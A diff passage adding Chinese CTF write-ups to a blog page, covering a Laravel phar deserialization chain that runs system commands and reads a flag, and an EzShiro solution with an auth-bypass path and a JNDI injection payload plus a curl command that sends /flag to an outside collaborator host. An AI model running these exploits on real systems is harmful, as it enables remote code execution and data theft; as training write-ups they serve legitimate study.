+    <span style=color:#00a8c8>class</span> <span style=color:#75af00>PendingBroadcast</span> <span style=color:#111>{</span>
+        <span style=color:#00a8c8>protected</span> <span style=color:#111>$events</span><span style=color:#111>;</span>
+        <span style=color:#00a8c8>protected</span> <span style=color:#111>$event</span><span style=color:#111>;</span>
+        <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>function</span> <span style=color:#111>__construct</span><span style=color:#111>(</span><span style=color:#111>$events</span><span style=color:#111>,</span> <span style=color:#111>$event</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+            <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>events</span> <span style=color:#f92672>=</span> <span style=color:#111>$events</span><span style=color:#111>;</span>
+            <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>event</span> <span style=color:#f92672>=</span> <span style=color:#111>$event</span><span style=color:#111>;</span>
+        <span style=color:#111>}</span>
+    <span style=color:#111>}</span>
+
+    <span style=color:#00a8c8>class</span> <span style=color:#75af00>BroadcastEvent</span> <span style=color:#111>{</span>
+        <span style=color:#00a8c8>public</span> <span style=color:#111>$connection</span><span style=color:#111>;</span>
+        <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>function</span> <span style=color:#111>__construct</span><span style=color:#111>(</span><span style=color:#111>$connection</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+            <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>connection</span> <span style=color:#f92672>=</span> <span style=color:#111>$connection</span><span style=color:#111>;</span>
+        <span style=color:#111>}</span>
+    <span style=color:#111>}</span>
+<span style=color:#111>}</span>
+
+<span style=color:#00a8c8>namespace</span> <span style=color:#75af00>Illuminate\Bus</span> <span style=color:#111>{</span>
+    <span style=color:#00a8c8>class</span> <span style=color:#75af00>Dispatcher</span> <span style=color:#111>{</span>
+        <span style=color:#00a8c8>protected</span> <span style=color:#111>$queueResolver</span><span style=color:#111>;</span>
+        <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>function</span> <span style=color:#111>__construct</span><span style=color:#111>(</span><span style=color:#111>$queueResolver</span><span style=color:#111>){</span>
+            <span style=color:#111>$this</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>queueResolver</span> <span style=color:#f92672>=</span> <span style=color:#111>$queueResolver</span><span style=color:#111>;</span>
+        <span style=color:#111>}</span>
+    <span style=color:#111>}</span>
+<span style=color:#111>}</span>
+
+
+<span style=color:#00a8c8>namespace</span> <span style=color:#111>{</span>
+    <span style=color:#111>$c</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>Illuminate\Broadcasting\BroadcastEvent</span><span style=color:#111>(</span><span style=color:#d88200>&#39;ls&#39;</span><span style=color:#111>);</span>
+    <span style=color:#111>$b</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>Illuminate\Bus\Dispatcher</span><span style=color:#111>(</span><span style=color:#d88200>&#39;system&#39;</span><span style=color:#111>);</span>
+    <span style=color:#111>$a</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>Illuminate\Broadcasting\PendingBroadcast</span><span style=color:#111>(</span><span style=color:#111>$b</span><span style=color:#111>,</span> <span style=color:#111>$c</span><span style=color:#111>);</span>
+    <span style=color:#75715e>#print(urlencode(serialize($a)));
+</span><span style=color:#75715e></span>    <span style=color:#f92672>@</span><span style=color:#75af00>unlink</span><span style=color:#111>(</span><span style=color:#d88200>&#34;phar.phar&#34;</span><span style=color:#111>);</span>
+    <span style=color:#111>$phar</span><span style=color:#f92672>=</span><span style=color:#00a8c8>new</span> <span style=color:#75af00>Phar</span><span style=color:#111>(</span><span style=color:#d88200>&#34;phar.phar&#34;</span><span style=color:#111>);</span>
+    <span style=color:#111>$phar</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>startBuffering</span><span style=color:#111>();</span>
+    <span style=color:#111>$phar</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>setStub</span><span style=color:#111>(</span><span style=color:#d88200>&#39;GIF89a&#39;</span><span style=color:#f92672>.</span><span style=color:#d88200>&#34;__HALT_COMPILER();&#34;</span><span style=color:#111>);</span>
+    <span style=color:#111>$phar</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>setMetadata</span><span style=color:#111>(</span><span style=color:#111>$a</span><span style=color:#111>);</span>
+    <span style=color:#111>$phar</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>addFromString</span><span style=color:#111>(</span><span style=color:#d88200>&#34;test.txt&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;test&#34;</span><span style=color:#111>);</span>
+    <span style=color:#111>$phar</span><span style=color:#f92672>-&gt;</span><span style=color:#75af00>stopBuffering</span><span style=color:#111>();</span>
+<span style=color:#111>}</span>
+</code></pre></div><p>将生成的phar文件用gzip压缩后上传（记得要改一下content-type），在image处访问<code>/image?image=phar://../storage/app/uploads/xxxxxxxxxx.png</code>即可看到隐藏在500报错下面的phpinfo</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210803004021941.png alt=image-20210803004021941></p>
+<p>光看到phpinfo不是目标，还需要继续执行命令，这里用的是第二个链子 相当于执行以下的命令</p>
+<pre tabindex=0><code>system(&quot;cd ../../../;ls&quot;);
+system(&quot;cd ../../../;cat flag&quot;);
+</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210803122653978.png alt=image-20210803122653978></p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210803122933503.png alt=image-20210803122933503></p>
+<p>参考：<a href=https://guokeya.github.io/post/z5gHcmbVj/>wp1</a> <a href=https://vuln.top/2021/05/08/16204457586099/>wp2</a></p>
+<p>————哄堂大孝了家人们 我是憨批 这个get传image的地方我一直在用post传 我还在纳闷为啥一直会报405的错😅😅😅</p>
+</details>
+<details>
+<summary>
+<h4 class=inline>
+[NPUCTF2020]EzShiro
+</h4>
+</summary>
+<p>和 [红明谷CTF 2021]JavaWeb 是完全一样的payload</p>
+<p>首先是一个/;/json绕过鉴权，之后是jndi注入，用那个jar一把梭</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=color:#111>[</span><span style=color:#d88200>&#34;ch.qos.logback.core.db.JNDIConnectionSource&#34;</span><span style=color:#111>,{</span><span style=color:#f92672>&#34;jndiLocation&#34;</span><span style=color:#111>:</span><span style=color:#d88200>&#34;rmi://101.35.114.107:1099/qhx0ip&#34;</span><span style=color:#111>}]</span>
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span style=color:#d88200>&#34;curl http://mg6uynla2pxa8ilgp4cprm0suj09oy.burpcollaborator.net/ -F file=@/flag&#34;</span> -A <span style=color:#d88200>&#34;101.35.114.107&#34;</span>
+</code></pre></div></details>
 </div>
 </section>
 </article>
@@ -2760,7 +3814,7 @@ placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search>
 </div>
 <div class="text-sm text-gray-500 leading-tight a-gray">
 <br>
-Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 17075 words in this page.
+Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 25089 words in this page.
 </div>
 </div>
 </div>
